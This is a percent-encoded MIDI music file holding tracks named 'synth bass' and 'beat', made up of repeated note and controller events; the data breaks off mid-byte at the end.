%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%82%68%94%23%5F%87%40%84%23%50%00%94%27%5F%87%40%84%27%50%00%94%20%5F%A9%20%84%20%50%83%60%94%20%5F%9E%00%84%20%50%81%FF%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%23%5F%87%40%84%23%50%00%94%27%5F%87%40%84%27%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%23%5F%87%40%84%23%50%00%94%27%5F%87%40%84%27%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%23%5F%87%40%84%23%50%00%94%27%5F%87%40%84%27%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%82%68%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%78%84%20%50%00%B4%07%7C%00%B5%07%7C%00%94%20%5F%78%B4%07%78%00%B5%07%78%78%B4%07%73%00%B5%07%73%78%B4%07%6F%00%B5%07%6F%78%B4%07%6B%00%B5%07%6B%78%B4%07%67%00%B5%07%67%78%B4%07%62%00%B5%07%62%78%B4%07%5E%00%B5%07%5E%78%B4%07%5A%00%B5%07%5A%78%B4%07%56%00%B5%07%56%78%B4%07%51%00%B5%07%51%78%B4%07%4D%00%B5%07%4D%78%B4%07%49%00%B5%07%49%78%B4%07%45%00%B5%07%45%78%B4%07%40%00%B5%07%40%78%B4%07%3C%00%B5%07%3C%78%B4%07%38%00%B5%07%38%00%84%20%50%00%FF%2F%00%4D%54%72%6B%00%00%0F%74%00%FF%03%0A%73%79%6E%74%68%20%62%61%73%73%00%B6%64%00%00%65%00%00%06%0C%00%E6%00%40%00%B7%64%00%00%65%00%00%06%0C%00%E7%00%40%00%C6%51%00%C7%51%00%B6%07%7F%00%B7%07%7F%00%B6%0A%40%00%B7%0A%40%00%B6%5D%00%00%B7%5D%00%00%B6%5B%00%00%B7%5B%00%00%B6%5C%00%00%B7%5C%00%00%B6%5F%00%00%B7%5F%00%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%82%68%96%23%5F%87%40%86%23%50%00%96%27%5F%87%40%86%27%50%00%96%20%5F%A9%20%86%20%50%83%60%96%20%5F%9E%00%86%20%50%81%FF%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%85%50%96%20%5F%78%86%20%50%00%96%20%5F%83%60%86%20%50%00%96%20%5F%82%68%86%20%50%00%96%20%5F%83%60%86%20%50%84%58%96%23%5F%83%60%86%23%50%78%96%23%5F%81%70%86%23%50%00%96%21%5F%83%60%86%21%50%78%96%21%5F%78%86%21%50%00%96%23%5F%78%86%23%50%00%96%20%5F%83%60%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%23%5F%87%40%86%23%50%00%96%27%5F%87%40%86%27%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%23%5F%87%40%86%23%50%00%96%27%5F%87%40%86%27%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%23%5F%87%40%86%23%50%00%96%27%5F%87%40%86%27%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%00%96%20%5F%81%70%86%20%50%82%68%96%20%5F%81%70%86%20%50%00%96%20%5F%78%86%20%50%00%96%20%5F%81%70%86%20%50%81%70%96%20%5F%78%86%20%50%00%96%20%5F%78%86%20%50%00%B6%07%7C%00%B7%07%7C%00%96%20%5F%78%B6%07%78%00%B7%07%78%78%B6%07%73%00%B7%07%73%78%B6%07%6F%00%B7%07%6F%78%B6%07%6B%00%B7%07%6B%78%B6%07%67%00%B7%07%67%78%B6%07%62%00%B7%07%62%78%B6%07%5E%00%B7%07%5E%78%B6%07%5A%00%B7%07%5A%78%B6%07%56%00%B7%07%56%78%B6%07%51%00%B7%07%51%78%B6%07%4D%00%B7%07%4D%78%B6%07%49%00%B7%07%49%78%B6%07%45%00%B7%07%45%78%B6%07%40%00%B7%07%40%78%B6%07%3C%00%B7%07%3C%78%B6%07%38%00%B7%07%38%00%86%20%50%00%FF%2F%00%4D%54%72%6B%00%00%36%83%00%FF%03%04%62%65%61%74%00%B9%64%00%00%65%00%00%06%0C%00%E9%00%40%00%C9%00%00%B9%07%70%00%0A%40%00%5D%00%00%5B%00%00%5C%00%00%5F%00%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%83%60%89%23%50%00%24%50%00%24%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%8